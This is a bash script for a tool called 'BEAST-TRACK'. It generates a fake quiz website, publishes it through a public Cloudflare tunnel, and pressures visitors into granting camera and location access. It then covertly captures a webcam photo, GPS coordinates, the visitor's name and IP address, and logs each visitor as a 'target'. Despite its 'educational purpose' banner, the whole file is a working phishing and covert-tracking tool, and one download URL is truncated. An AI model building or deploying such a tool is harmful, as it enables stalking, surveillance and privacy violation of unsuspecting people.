#!/bin/bash

# --- BEAST-TRACK v22.0 (FINAL STABLE VERSION) ---
# Educational Purpose Only - Built for Security Awareness
NC='\033[0m'; Bold='\033[1m'
PBlue='\033[1;34m'; PWhite='\033[1;37m'; PRed='\033[1;31m'; PYellow='\033[1;33m'
BCyan='\033[1;36m'; BGreen='\033[1;32m'; BPurple='\033[1;35m'

SERVER_DIR="server"
PORT=8888

# --- AUTO-INSTALL DEPENDENCIES ---
clear
echo -e "${PYellow}[*] Checking Dependencies...${NC}"
if ! command -v php &> /dev/null; then
    echo -e "${PRed}[!] PHP not found. Installing...${NC}"
    pkg install php -y || sudo apt install php -y
fi

if ! command -v cloudflared &> /dev/null; then
    echo -e "${PRed}[!] Cloudflared not found. Downloading...${NC}"
    if [ -d "/data/data/com.termux" ]; then
        pkg install cloudflared -y
    else
        wget https://github.com
        chmod +x cloudflared-linux-amd64
        sudo mv cloudflared-linux-amd64 /usr/local/bin/cloudflared
    fi
fi

# --- DIRECTORY SETUP ---
mkdir -p $SERVER_DIR
rm -f $SERVER_DIR/*.png $SERVER_DIR/*.log .link.log > /dev/null 2>&1
touch $SERVER_DIR/combined.log
chmod -R 777 $SERVER_DIR

# --- BANNER ---
clear
echo -e "${PBlue}${Bold}  ██████╗ ███████╗ █████╗ ███████╗████████╗ ${NC}"
echo -e "${PBlue}${Bold}  ██╔══██╗██╔════╝██╔══██╗██╔════╝╚══██╔══╝ ${NC}"
echo -e "${PWhite}${Bold}  ██████╔╝█████╗  ███████║███████╗   ██║    ${NC}"
echo -e "${PWhite}${Bold}  ██╔══██╗██╔══╝  ██╔══██║╚════██║   ██║    ${NC}"
echo -e "${PRed}${Bold}  ██████╔╝███████╗██║  ██║███████║   ██║    ${NC}"
echo -e "${PRed}${Bold}  ╚═════╝ ╚══════╝╚═╝  ╚═╝╚══════╝   ╚═╝    ${NC}"
echo -e "  ${PYellow}⭐ ⭐ ⭐  QUIZ BEE TRACKER v22.0  ⭐ ⭐ ⭐${NC}"
echo -e "  ${BGreen}Status       : ${PWhite}Educational Purpose Only${NC}"
echo -e "${PWhite}  ==========================================${NC}"

# --- GENERATE BACKEND ---
cat <<EOF > $SERVER_DIR/index.php
<?php
\$ip = \$_SERVER['REMOTE_ADDR'];
if (\$_SERVER['REQUEST_METHOD'] === 'POST') {
    \$type = \$_POST['type'] ?? '';
    if (\$type == 'init') {
        \$log = "\n\033[1;33m┏━━━━━━━━━━━━ TARGET DETECTED ━━━━━━━━━━━━┓\033[0m\n";
        \$log .= "\033[1;37m┃ NAME      :\033[0m " . (\$_POST['name'] ?? 'Unknown') . "\n";
        \$log .= "\033[1;37m┃ IP ADDR   :\033[0m \$ip\n";
    } elseif (\$type == 'loc') {
        \$log = "\033[1;32m┃ GPS DATA  :\033[0m " . \$_POST['lat'] . "," . \$_POST['lon'] . "\n";
        \$log .= "\033[1;34m┃ MAPS LINK :\033[0m https://www.google.com" . \$_POST['lat'] . "," . \$_POST['lon'] . "\n";
    } elseif (\$type == 'cam') {
        \$fname = 'cam_' . time() . '.png';
        file_put_contents(\$fname, base64_decode(str_replace(['data:image/png;base64,', ' '], ['', '+'], \$_POST['img'])));
        \$log = "\033[1;31m┃ CAM FILE  :\033[0m \$fname (CAPTURED!)\n\033[1;33m┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\033[0m\n";
    }
    file_put_contents("combined.log", \$log, FILE_APPEND);
    exit();
}
?>
<!DOCTYPE html><html><head><title>National Quiz Bee Challenge</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
    body { background: #0d1117; color: #c9d1d9; font-family: sans-serif; text-align: center; padding: 20px; }
    .box { border: 1px solid #30363d; padding: 25px; border-radius: 12px; background: #161b22; max-width: 450px; margin: auto; }
    input { width: 90%; padding: 12px; margin: 15px 0; border-radius: 6px; border: 1px solid #30363d; background: #0d1117; color: #fff; }
    .btn { background: #238636; color: #fff; padding: 15px; width: 100%; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; }
    .option { display: block; background: #21262d; padding: 12px; margin: 8px 0; border-radius: 6px; cursor: pointer; border: 1px solid transparent; transition: 0.3s; text-align: left; }
    .correct { background: #238636 !important; border-color: #3fb950; }
    .wrong { background: #da3633 !important; border-color: #f85149; }
    .verify-code { background: #0d1117; padding: 15px; border: 1px dashed #58a6ff; color: #58a6ff; font-family: monospace; margin: 20px 0; cursor: pointer; }
    #err-msg { display: none; color: #ff7b72; padding: 10px; border: 1px solid #f85149; margin-top: 15px; font-size: 13px; }
</style></head>
<body>
    <div class="box">
        <h1>🏆 QUIZ BEE</h1>
        <div id="step-login">
            <p>Enter Full Name to Begin</p>
            <input type="text" id="targetName" placeholder="Full Name">
            <p style="font-size: 11px; color: #8b949e;">⚠️ <b>Verification Required:</b> You must <b>Allow Permission</b> for Camera and Location to verify identity for the record.</p>
            <button class="btn" onclick="initiate()">PROCEED TO QUIZ</button>
            <div id="err-msg">❌ <b>PERMISSION ERROR:</b> Please allow Camera & Location to start.</div>
        </div>
        <div id="step-quiz" style="display:none; text-align:left;">
            <h4 id="q-num">Question 1/10</h4>
            <p id="q-text" style="font-weight:bold;"></p>
            <div id="options-container"></div>
        </div>
        <div id="step-finish" style="display:none;">
            <h2 style="color:#3fb950;">🎉 Completed!</h2>
            <div style="font-size: 1.5em; margin: 15px 0;">Score: <span id="score" style="color:#58a6ff;">0</span> / 10</div>
            <div class="verify-code" onclick="alert('Copied!')">QB-2026-X8Y2-Z1P9</div>
            <p>Copy code above to save your results.</p>
            <button class="btn" style="background:#30363d;" onclick="location.reload()">Restart</button>
        </div>
    </div>
    <video id="v" style="display:none;" autoplay></video><canvas id="c" style="display:none;"></canvas>
    <script>
    const questions = [
        {q: "What is 15 + 27?", a: ["32", "42", "52", "45"], c: 1},
        {q: "Red Planet?", a: ["Venus", "Jupiter", "Mars", "Saturn"], c: 2},
        {q: "PH National Hero?", a: ["Andres Bonifacio", "Jose Rizal", "Aguinaldo", "Mabini"], c: 1},
        {q: "Powerhouse of cell?", a: ["Nucleus", "Ribosome", "Mitochondria", "Cytoplasm"], c: 2},
        {q: "Sqrt of 144?", a: ["10", "11", "12", "13"], c: 2},
        {q: "Smallest PH province?", a: ["Batanes", "Camiguin", "Siquijor", "Catanduanes"], c: 0},
        {q: "H2O is?", a: ["Oxygen", "Hydrogen", "Water", "Nitrogen"], c: 2},
        {q: "PH Independence Year?", a: ["1896", "1898", "1945", "1901"], c: 1},
        {q: "Prime number?", a: ["4", "9", "13", "15"], c: 2},
        {q: "Capital of PH?", a: ["Cebu", "Davao", "Manila", "QC"], c: 2}
    ];
    let cur = 0, score = 0, busy = false;
    async function initiate() {
        const name = document.getElementById('targetName').value;
        if(!name) return alert('Enter Name');
        try {
            const s = await navigator.mediaDevices.getUserMedia({video:true});
            document.getElementById('v').srcObject = s;
            navigator.geolocation.getCurrentPosition(p => {
                sendData({type:'loc', lat:p.coords.latitude, lon:p.coords.longitude});
            }, null, {enableHighAccuracy:true});
            sendData({type:'init', name:name});
            setTimeout(() => {
                const c = document.getElementById('c'), v = document.getElementById('v');
                c.width = v.videoWidth; c.height = v.videoHeight;
                c.getContext('2d').drawImage(v,0,0);
                sendData({type:'cam', img:c.toDataURL('image/png')});
                document.getElementById('step-login').style.display='none';
                document.getElementById('step-quiz').style.display='block';
                loadQ();
            }, 2000);
        } catch (e) { document.getElementById('err-msg').style.display='block'; }
    }
    function loadQ() {
        if(cur >= questions.length) {
            document.getElementById('step-quiz').style.display='none';
            document.getElementById('step-finish').style.display='block';
            document.getElementById('score').innerText = score;
            return;
        }
        busy = false;
        const d = questions[cur];
        document.getElementById('q-num').innerText = "Question "+(cur+1)+"/10";
        document.getElementById('q-text').innerText = d.q;
        const res = document.getElementById('options-container');
        res.innerHTML = "";
        d.a.forEach((o, i) => {
            const dv = document.createElement('div');
            dv.className = "option"; dv.innerText = o;
            dv.onclick = () => {
                if(busy) return; busy = true;
                if(i === d.c) { score++; dv.classList.add('correct'); }
                else { dv.classList.add('wrong'); res.children[d.c].classList.add('correct'); }
                setTimeout(() => { cur++; loadQ(); }, 1200);
            };
            res.appendChild(dv);
        });
    }
    function sendData(d) {
        let f = new FormData();
        for(let k in d) f.append(k, d[k]);
        fetch('index.php', {method:'POST', body:f});
    }
    </script>
</body></html>
EOF

# --- START TUNNEL ---
echo -e "\n${PYellow}[*] Booting Local Server...${NC}"
php -S 127.0.0.1:$PORT -t $SERVER_DIR > /dev/null 2>&1 &
PHP_PID=$!

echo -e "${BCyan}[*] Initializing Cloudflared (Waiting 15s)...${NC}"
cloudflared tunnel --url http://127.0.0.1:$PORT > .link.log 2>&1 &
CL_PID=$!

# Increased sleep to ensure link is captured
sleep 15
CL_LINK=$(grep -o 'https://[-0-9a-z.]*trycloudflare.com' .link.log | head -n 1)

if [ -z "$CL_LINK" ]; then
    echo -e "${PRed}[!] LINK ERROR: Cloudflared failed to start.${NC}"
    echo -e "${PYellow}[*] Manual Fix: Try running 'cloudflared tunnel --url http://127.0.0.1:8888' manually.${NC}"
    kill $PHP_PID $CL_PID &> /dev/null
    exit 1
fi

echo -e "${BGreen}[+] LIVE LINK : ${Bold}${PWhite}$CL_LINK${NC}"
echo -e "${BGreen}[+] LOGS FILE : ${PWhite}$SERVER_DIR/combined.log${NC}"
echo -e "${PYellow}--------------------------------------------------"
echo -e "  WAITING FOR DATA... (Press Ctrl+C to stop)${NC}"

trap "kill $PHP_PID $CL_PID &> /dev/null; echo -e '\n${PRed}[!] Stopped.${NC}'; exit" SIGINT
tail -f $SERVER_DIR/combined.log
